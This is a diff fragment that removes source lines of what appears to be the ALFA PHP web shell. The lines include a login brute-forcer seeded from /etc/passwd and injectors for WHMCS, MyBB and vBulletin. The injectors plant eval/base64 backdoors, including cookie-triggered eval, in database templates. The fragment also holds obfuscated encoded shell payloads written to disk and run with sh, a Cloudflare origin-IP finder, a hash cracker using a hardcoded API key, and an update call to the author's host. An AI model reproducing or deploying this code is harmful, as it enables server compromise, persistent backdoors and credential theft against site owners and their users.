-echo '<div class="header"><center><br><div class="txtfont_header">| Brute Forcer |</div><br><br><form method="post" onsubmit="g(\'Crackers\',null,this.target.value,this.port.value,this.usernames.value,this.passwords.value,this.fcrack.value,\'start\',this.protocol.value,this.loginpanel.value);return false;"><div class="txtfont">Login Page: <select onclick="dis_input(this.value);" name="loginpanel">';
-foreach(array('cp'=>'Cpanel','direct'=>'DirectAdmin','ftp'=>'FTP','phpmyadmin'=>'PhpMyAdmin[DirectAdmin]','mysql'=>'mysql_connect()','ftpc'=>'ftp_connect()') as $key=>$val)echo('<option value="'.$key.'">'.$val.'</option>');
-echo '</select> Protocol: <select id="protocol" name="protocol">';
-foreach(array('https://','http://','ftp://') as $val)echo('<option value="'.$val.'">'.$val.'</option>');
-echo '</select> Website/ip Address: <input id="target" type="text" name="target" value="localhost">
-Port: <input id="port" type="text" name="port" value="2083">
-<table width="30%"><td align="center">Users List</td><td align="center">Passwords</td></table>
-<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?alfaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
-&nbsp <textarea placeholder="Passwords" rows="20" cols="25" name="passwords"></textarea><br><br>
-Save Result Into File <input type="text" name="fcrack" value="cracked.txt">
-<p><input type="submit" name="cracking" value=" " /></div></form></p><center>';
-$target = str_replace(array('https://','http://','ftp://'),'',$_POST['alfa1']);
-$port = $_POST['alfa2'];
-$usernames= $_POST['alfa3'];
-$passwords = $_POST['alfa4'];
-$fcrack = $_POST['alfa5'];
-$cracking = $_POST['alfa6'];
-$protocol = $_POST['alfa7'];
-$loginpanel = $_POST['alfa8'];
-$p = $loginpanel == 'phpmyadmin' ? $p = true : false;
-if($cracking=='start'){
-echo __pre();
-$exuser = explode("\n",$usernames);
-$expw = explode("\n",$passwords);
-foreach($exuser as $user){
-foreach($expw as $pw){
-$array = array('username' => trim($user),'password' => trim($pw),'port' => trim($port),'target' => trim($target),'protocol' => trim($protocol),'fcrack' => trim($fcrack),'mysql' => $p);
-Alfa_Call_Function_Cracker($loginpanel,$array);
-}
-}
-echo '<br><font color="red">Attack Finished...</font>';
-}
-echo '</div>';
-alfafooter();
-}
-function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
-function alfaShellInjectors(){
-alfahead();
-echo '<div class=header>';
-AlfaNum(11);
-echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
-$selector = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
-if(isset($_POST['alfa1']) && $_POST['alfa1']== 'whmcs'){
-AlfaNum();
-echo __pre()."<p><div class='txtfont_header'>| WHMCS |</div></p><center><center><p>".getConfigHtml('whmcs')."</p><form onSubmit=\"g('ShellInjectors',null,'whmcs',null,null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.path.value); return false;\" method='post'>";
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name : ', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User : ', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
-);
-create_table($table);
-echo $selector;
-echo "<p><input type='submit' value=' '></p></form></center></td></tr></table></center>";
-if(isset($_POST['alfa6'])) {
-$dbu = $_POST['alfa6'];
-$dbn = $_POST['alfa7'];
-$dbp = $_POST['alfa8'];
-$dbh = $_POST['alfa9'];
-$path = $_POST['alfa10'];
-$method = $_POST['alfa4'];
-$index = "{php}".ALFA_UPLOADER.";{/php}";
-$newin = str_replace("'","\'",$index);
-$newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
-if(!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)){
-if(filter_var($path,FILTER_VALIDATE_URL)){
-$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_connect_error());
-$soleSave= mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
-$soleGet = mysqli_fetch_assoc($soleSave);
-$tempSave1 = $soleGet['message'];
-$tempSave = str_replace("'","\'",$tempSave1);
-mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
-$inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
-$result =mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
-$result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
-if(function_exists('curl_version') && $method == 'auto'){
-$AlfaSole = new AlfaCURL(true);
-$saveurl = $AlfaSole->Send($path."/pwreset.php");
-$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
-$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
-$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
-__alert("shell injectet...");
-$ff= 'http://'.$path."/solevisible.php";
-output($ff);}else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
-}if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
-AlfaNum(1,2,3,5);
-echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
-";
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'dbh', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'dbn', 'id'=>'db_name' ,'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'dbu', 'id'=>'db_user', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'dbp', 'id'=>'db_pw', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'prefix', 'id'=>'db_prefix','inputValue' => 'mybb_', 'inputSize' => '50')
-);
-create_table($table);
-echo $selector;
-echo "<p><input type=submit value=' '></p></form></center></center>";
-if(isset($_POST['alfa6'])) {
-$dbu = $_POST['alfa6'];
-$dbn = $_POST['alfa7'];
-$dbp = $_POST['alfa8'];
-$dbh = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$method = $_POST['alfa4'];
-$shellCode = "{\${".ALFA_UPLOADER."}}";
-$newinshell = str_replace("'","\'",$shellCode);
-if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)){
-$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
-$inject = "select template from {$prefix}templates where  title= 'calendar'";
-$result = mysqli_query($conn, $inject) or die (mysqli_error($conn));
-$GetTemp = mysqli_fetch_assoc($result);
-$saveDate = $GetTemp['template'];
-$repsave = str_replace($shellCode,"",$saveDate);
-$repsave = str_replace("'","\'",$repsave);
-$createShell = "update {$prefix}templates SET template= '".$newinshell.$repsave."' where title = 'calendar'";
-$result2 = mysqli_query($conn,$createShell) or die (mysqli_error($conn));
-$geturl = "select value from {$prefix}settings where name= 'bburl'";
-$findurl = mysqli_query($conn,$geturl) or die (mysqli_error($conn));
-$rowb = mysqli_fetch_assoc($findurl);
-$furl = $rowb['value'];
-$realurl = parse_url($furl,PHP_URL_HOST);
-$realpath = parse_url($furl,PHP_URL_PATH);
-$res = false;
-$AlfaCurl = new AlfaCURL();
-if (extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto' ){
-if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
-@fputs($fsock, "GET $realpath/calendar.php HTTP/1.1\r\n");
-@fputs($fsock, "HOST: $realurl\r\n");
-@fputs($fsock, "Connection: close\r\n\r\n");
-$check = fgets($fsock);
-if(preg_match("/200 OK/i",$check)){
-$repairdbtemp = "update {$prefix}templates SET template= '$repsave' where title = 'calendar'";
-$clear = mysqli_query($conn,$repairdbtemp) or die (mysqli_error($conn));$res = true;}
-@fclose($fsock);}}elseif(function_exists('curl_version') && $method == 'auto'){
-$AlfaCurl->Send($realurl.$realpath."/calendar.php");
-$res = true;
-}
-if($res){
-$ff = 'http://'.$realurl.$realpath."/solevisible.php";
-output($ff);
-}else{
-$ff = 'http://'.$realurl.$realpath."/calendar.php";
-$fff = 'http://'.$realurl.$realpath."/solevisible.php";
-echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#FFFFFF'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
-}}}}
-if(isset($_POST['alfa3']) && $_POST['alfa3']== 'vb'){
-AlfaNum(1,2,7,9,10);
-echo __pre().'<p><div class="txtfont_header">| vbulletin |</div></p><p>'.getConfigHtml('vb').'</p><form name="frm" method="POST" onsubmit="g(\'ShellInjectors\',null,null,this.lo.value,\'vb\',this.user.value,this.pass.value,this.tab.value,this.db.value,this.method.value); return false;">';
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'db', 'id'=>'db_name','inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'user', 'id'=>'db_user','inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'pass', 'id'=>'db_pw','inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'tab', 'id'=>'db_prefix','inputValue' => '', 'inputSize' => '50')
-);
-create_table($table);
-echo $selector;
-echo '<p><input type="submit" value=" " /></p></form></center>';
-if(isset($_POST['alfa4'])&&!empty($_POST['alfa4'])){
-$method = $_POST['alfa8'];
-$faq_name = "faq";
-$faq_file = "/faq.php";
-$code = "{\${".ALFA_UPLOADER."}}{\${exit()}}&";
-$conn=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_connect_error());
-$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
-$recivedata = @mysqli_query($conn,$rec);
-$getd = @mysqli_fetch_assoc($recivedata);
-$savetoass = $getd['template'];
-if(empty($savetoass)){
-	$faq_name = "header";
-	$faq_file = "/";
-	$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
-	$recivedata = @mysqli_query($conn,$rec);
-	$getd = @mysqli_fetch_assoc($recivedata);
-	$savetoass = $getd['template'];
-	$code = ALFA_UPLOADER.";";
-}
-$code = str_replace("'","\'",$code);
-$p = "UPDATE ".$_POST['alfa6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
-$ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
-$geturl = @mysqli_query($conn,"select `value` from ".$_POST['alfa6']."setting WHERE `varname`='bburl'");
-$getval = @mysqli_fetch_assoc($geturl);
-$saveval = $getval['value'];
-if($faq_name == "header"){
-	if(substr($saveval, -5, 5) == "/core"){
-		$saveval = substr($saveval, 0, -5);
-	}
-}
-$realurl = parse_url($saveval,PHP_URL_HOST);
-$realpath = parse_url($saveval,PHP_URL_PATH);
-$res = false;
-$AlfaCurl = new AlfaCURL();
-if(extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto'){
-if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
-@fputs($fsock, "GET $realpath.$faq_file HTTP/1.1\r\n");
-@fputs($fsock, "HOST: $realurl\r\n");
-@fputs($fsock, "Connection: close\r\n\r\n");
-$check = fgets($fsock);
-if(preg_match("/200 OK/i",$check)){
-$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
-$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
-$res = true;
-}
-@fclose($fsock);}
-}elseif(function_exists('curl_version') && $method == 'auto'){
-$AlfaCurl->Send($realurl.$realpath.$faq_file);
-$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
-$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
-$res = true;
-}
-if($res){
-$ff = 'http://'.$realurl.$realpath."/solevisible.php";
-output($ff);
-}else{
-$ff = 'http://'.$realurl.$realpath.$faq_file;
-$fff = 'http://'.$realurl.$realpath."/solevisible.php";
-echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
-echo '</div>';
-alfafooter();
-}
-function alfacheckfiletype(){
-	$path = $_POST['path'];
-	$arg = $_POST['arg'];
-	if(@is_file($path.'/'.$arg)){
-		echo("file");
-	}else{
-		echo("dir");
-	}
-}
-function alfacheckupdate(){
-	if($GLOBALS["DB_NAME"]["cgi_api"]){
-		if(!isset($_COOKIE["alfacgiapi_mode"])&&!isset($_COOKIE["alfacgiapi"])){
-			_alfa_cgicmd("whoami","perl",true);
-			if(strlen(alfaEx("whoami",false,$cgi))>0){
-				__alfa_set_cookie("alfa_canruncmd", "true");
-			}
-		}
-	}
-	if(function_exists("curl_version")){
-		$update = new AlfaCURL();
-		$json = $update->Send("http://solevisible.com/update.json?ver=".__ALFA_VERSION__);
-		$json = @json_decode($json,true);
-		$data = array();
-		if($json){
-			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"])){
-				if($json["type"] == "update"){
-					if(__ALFA_VERSION__ != $json['version'] || __ALFA_UPDATE__ != $json['version_number']){
-						@setcookie("alfa_checkupdate", "1", time()+86400);
-						$data["content"] = '<div class="update-holder">'.$json["content"].'</div>';
-					}
-				}
-			}
-			if(isset($json["ads"]) && !empty($json["ads"])){
-				$data["content"] .= $json["ads"];
-			}
-			if(isset($json["copyright"]) && !empty($json["copyright"])){
-				$data["copyright"] = $json["copyright"];
-			}
-			if(isset($json["solevisible"]) && !empty($json["solevisible"])){
-				$data["solevisible"] = $json["solevisible"];
-			}
-			if(isset($json["code_name"]) && !empty($json["code_name"])){
-				$data["code_name"] = $json["code_name"];
-				$data["version_number"] = __ALFA_VERSION__;
-			}
-			if(isset($json["market"]) && !empty($json["market"])){
-				$data["market"] = $json["market"];
-			}
-			echo @json_encode($data);
-		}
-	}
-}
-function alfaWriteTocgiapi($name, $source){
-	$temp = "";
-	$not_api = array("basedir.alfa", "getdir.alfa", "getheader.alfa");
-	if(in_array($name, $not_api)){
-		$temp = ALFA_TEMPDIR;
-		if($temp){
-			@chdir($temp);
-		}
-	}else{
-		alfaCreateParentFolder();
-		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
-	}
-	@mkdir('alfacgiapi',0755);
-	__write_file("alfacgiapi/".$name, __get_resource($source));
-	@chmod("alfacgiapi/".$name, 0755);
-	return $temp;
-}
-function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
-function alfaupdateheader(){
-	if(!isset($_COOKIE["updateheader_data"])){
-		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
-		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
-		$tmp_path = alfaWriteTocgiapi("getheader.alfa",$bash);
-		$data = alfaEx("cd '{$tmp_path}/alfacgiapi';sh getheader.alfa",false,true,true);
-		if(@is_array(@json_decode($data,true))){
-			__alfa_set_cookie("updateheader_data", $data);
-			echo $data;
-		}
-	}else{
-		echo $_COOKIE["updateheader_data"];
-	}
-}
-function alfassiShell(){
-alfahead();
-echo '<div class=header>';
-alfaCreateParentFolder();
-@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
-@mkdir('alfa_shtml',0755);
-@chdir('alfa_shtml');
-alfacgihtaccess('shtml');
-$code = 'rVb9b9s2EP1Xrky22MhsKcu6ptbH0A+vzYbCXeztl6YoZImS2VCkQFJOvCX/+46SrChOnKRBA8ORyOPju3ePR/vPBoOdWIqUZUCVynUWkE9jpaT6TAaD0O9Ma/YvTXMTkPnKUN3OshToRaEC0jslu+9ns49f3kwmfx6PTwkEcEpOSR8uL8FOnoz/+ns8nX35MJ69n7zF+Wc24N14hjEE1niaGlhGiKcXnOATL2lAuIYBj66DKNf03hVdJterRIJs8Q2+C/OPk+kW6kzELXVnOLzjQ03sFJHW58lDSXWwNpOCzawWJuehv6BREvqGGU7DVzyNYEajHKbTY5guKOe+U0/5OlasMMAjkZVRhlS/RsuoHiRhWorYMCkgkcz0IJcJhT78x9IejsRlToUZxlKeMWrFIMROIl+oxzQquBE21AW3SMTDWC+VqmfzA4aRrof//PXSIaciMwsP9vcZ9Dc3C9Zhn3DNZ9hHPCwiU1QHs0X5E7gH8Eck4ODlCxdcd1R94N2HGfGubkO1Ixk1Y07t4+vVcbJOd1jJ7rVRXMaR1WSoKJdR0ut7V61MRmYZpz1giVViO7KdH2qz4nSYMJQkWiGP3jeFo9xCCor2/A3IHEmdERg1Y96V79QlDH2nNsJcJiuQwjIOyLaN9mKZ55FI9vrDFEM05kZgnsWSS/Tgjlv9EYg4E2fYAVAWNGXnBbdRoZ+wZejHiEnxZXEY+qkUBtYgz1/G8eEhCS/hDlfCpe/YaEsbFzprFAvbPod+2WDaZhSQ/QOCmcWcxcijqcAeFcs9y75SLSBxqbRUo0IyC+JVZEaKJh4Jx2LJlLQaABOpbAngJs68wwHTwkIEBJFb2KYaI6t6A7rz64tXr9/+7jViFIrWR7lQdmuxtEfbqUbttFOJVX/f0u5xmWK/e2Smb+rqAh470HUT2JJrTchmjLXOBKJWEwTOWWIWATlw3R/QGVIlFGuKlrDCVI23YTGP4rNMyVIkg0aW2jzezZ57/31QNcUbEt9sdY3E8w2H1QWwhUXK0Fi6TXUejn4Uc1143W8EUDnk1CwkJoKnwuqsy3nOjD0t2LGuj4atLBNFacCsCkzV0AsMrwt01EjRBJOwge/G17DtzXBSCgR0LIFbPt8o/WaCJ1SX3HQyu3lgLLFI0ahzgukv1E2OKiSNVfwZQZU8t4/PSXP9XNAY4jwJdrGc1T3krHHwaql8AX5r129zKl5ij3TqpKCqarIaUSBlnOoHz2V1RT7Srt/JpfXdX9m0Rny6Wf9h9LxKFHrYjkwZcexGMS8T2h91KvyQdQup7/Du0gLf69wjt9KwCnySa7flNUX0BxLYtrTSL7X0oJEk2EVNrJj1yuonaNf+T3Z9I/WtfTrmv9WuHXul2ovK/tz6Hw==';
-@__write_file('alfa_ssi.shtml',__get_resource($code));
-@chmod("alfa_ssi.shtml",0755);
-echo AlfaiFrameCreator('alfa_shtml/alfa_ssi.shtml');
-echo '</div>';
-alfafooter();
-}
-function alfacloudflare(){
-alfahead();
-AlfaNum(8,9,10,7,6,5,4,3);
-echo "<div class=header><center><br><div class='txtfont_header'>| Cloud Flare ByPasser |</div><br><form action='' onsubmit=\"g('cloudflare',null,this.url.value,'>>'); return false;\" method='post'>
-<p><div class='txtfont'>Target:</div> <input type='text' size=30 name='url' style='text-align:center;' placeholder=\"target.com\"> <input type='submit' name='go' value=' ' /></p></form></center>";
-if($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
-$url = $_POST['alfa1'];
-if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url)){
-$url = preg_replace('/^(https?):\/\//', '', $url);
-$url = "http://www.".$url;
-}
-$headers = @get_headers($url, 1);
-$server = $headers['Server'];
-$subs = array('owa.','2tty.','m.','gw.','mx1.','store.','1','2','vb.','news.','download.','video','cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns3.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.', 'dl.', 'my.', 'cp.', 'portal.', 'kb.', 'support.','search.', 'docs.', 'files.', 'accounts.', 'secure.', 'register.', 'apps.', 'beta.', 'demo.', 'smtp.', 'ns2.', 'ns1.', 'server.', 'shop.', 'host.', 'web.', 'cloud.', 'api.', 'exchange.', 'app.', 'vps.', 'owa.', 'sat.', 'bbs.', 'movie.', 'music.', 'art.', 'fusion.', 'maps.', 'forums.', 'acc.', 'cc.', 'dev.', 'ww42.', 'wiki.', 'clients.', 'client.','books.','answers.','service.','groups.','images.','upload.','up.','tube.','users.','admin.','administrator.','private.','design.','whmcs.','wp.','wordpress.','joomla.','vbulletin.','test.','developer.','panel.','contact.');
-if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url, $matches)){
-if($matches[2] != 'www'){$url = preg_replace('/^(https?):\/\//', '', $url);}else{
-$url = explode($matches[0], $url);
-$url = $url[1];}}
-if(is_array($server))$server = $server[0];
-echo __pre();
-if(preg_match('/cloudflare/i', $server))
-echo "\n[+] CloudFlare detected: {$server}\n<br>";
-else
-echo "\n[+] CloudFlare wasn't detected, proceeding anyway.\n";
-echo '[+] CloudFlare IP: ' . is_ipv4(gethostbyname($url)) . "\n\n<br><br>";
-echo "[+] Searching for more IP addresses.\n\n<br><br>";for($x=0;$x<count($subs);$x++){
-$site = $subs[$x] . $url;
-$ip = is_ipv4(gethostbyname($site));
-if($ip == '(Null)')
-continue;
-echo "Trying {$site}: {$ip}\n<br>";
-}
-echo "\n[+] Finished.\n<br>";
-}
-echo '</div>';
-alfafooter();
-}
-function is_ipv4($ip){
-return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : '(Null)';
-}
-function __alert($s){
-echo '<center>'.__pre().$s.'</center>';
-}
-function create_table($data){
-echo '<table border="1">';
-foreach ($data as $key => $val){
-$array = array();
-foreach($val as $k => $v){
-$array[$k] = $v;
-}
-echo "<tr><td><div class='tbltxt'>".$array['tdName']."</div></td><td><input type='text' id='".$array['id']."' name='".$array['inputName']."' ".($array['placeholder']?'placeholder':'value')."='".$array['inputValue']."' size='".$array['inputSize']."' ".($array['disabled']?'disabled':'')."></td></tr>";
-}
-echo '</table>';
-}
-function alfaphp2xml(){
-alfahead();
-AlfaNum(8,9,10,7,6,5,4,3);
-echo "<div class=header><center><p><div class='txtfont_header'>| Shell For vBulletin |</div></p><form onsubmit=\"g('php2xml',null,this.code.value,'>>'); return false;\" method='post'>
-<p><br><textarea rows='12' cols='70' type='text' name='code' placeholder=\"insert your shell code\"></textarea><br/><br/>
-<input type='submit' name='go' value=' ' /></p></form></center>";
-if($_POST['alfa2']&&$_POST['alfa2']=='>>'){
-echo __pre()."<p><center><textarea rows='10' name='users' cols='80'>";
-echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['alfa1']).'\'));exit;}]]></phpcode></plugin></plugins>';
-echo '</textarea></center></p>';
-}
-echo '</center></div>';
-alfafooter();
-}
-function alfacpcrack(){
-alfahead();
-echo '<div class=header><center><p><div class="txtfont_header">| Hash Tools |</div></p><h3><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'dec\')">| DeCrypter | </a><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'analyzer\')">| Hash Analyzer | </a></h3></center>';
-if($_POST['alfa1']=='dec'){
-$algorithms = array('md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM');
-echo '<center><div class="txtfont_header">| DeCrypter |</div><br><br>
-<form onsubmit="g(\'cpcrack\',null,\'dec\',this.md5.value,\'>>\',this.alg.value); return false;"><div class="txtfont">Decrypt Method:</div> <select name="alg" style="width:100px;">';
-foreach($algorithms as $key=>$val){echo('<option value="'.$key.'">'.$val.'</option>');}
-echo'</select><input type="text" placeholder="Hash" name="md5" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
-if($_POST['alfa3'] == '>>'){
-$hash = $_POST['alfa2'];
-if(!empty($hash)){
-$hash_type = $_POST['alfa4'];
-$email = "privdayzcom@gmail.com";
-$code = "7b9fa79f92c3cd96";
-$target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
-$resp = @file_get_contents($target);
-if($resp==''){
-$get = new AlfaCURL();
-$resp = $get->Send($target);
-}
-echo __pre().'<center>';
-switch($resp){
-	case('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";break;
-	case('CODE ERREUR : 003'):echo "<b><font color='red'>Your request includes more than 400 hashes.</font></b>";break;
-	case('CODE ERREUR : 004'):echo "<b><font color='red'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
-	case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
-}
-if(substr($resp,0,4)!='CODE'&&$resp!=''){
-echo "<b>Result: <font color='green'>".$resp."</font></b>";
-}elseif(substr($resp,0,4)!='CODE'){
-echo "<font color='red'>NoT Found</font><br />";
-}
-echo('</center>');
-}
-}
-}
-if($_POST['alfa1']=='analyzer'){
-echo '<center><p><div class="txtfont_header">| Hash Analyzer |</div></p>
-<form onsubmit="g(\'cpcrack\',null,\'analyzer\',this.hash.value,\'>>\');return false;">
-<div class="txtfont">Hash: </div> <input type="text" placeholder="Hash" name="hash" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
-if($_POST['alfa3'] == '>>'){
-$hash = $_POST['alfa2'];
-if(!empty($hash)){
-$curl = new AlfaCURL();
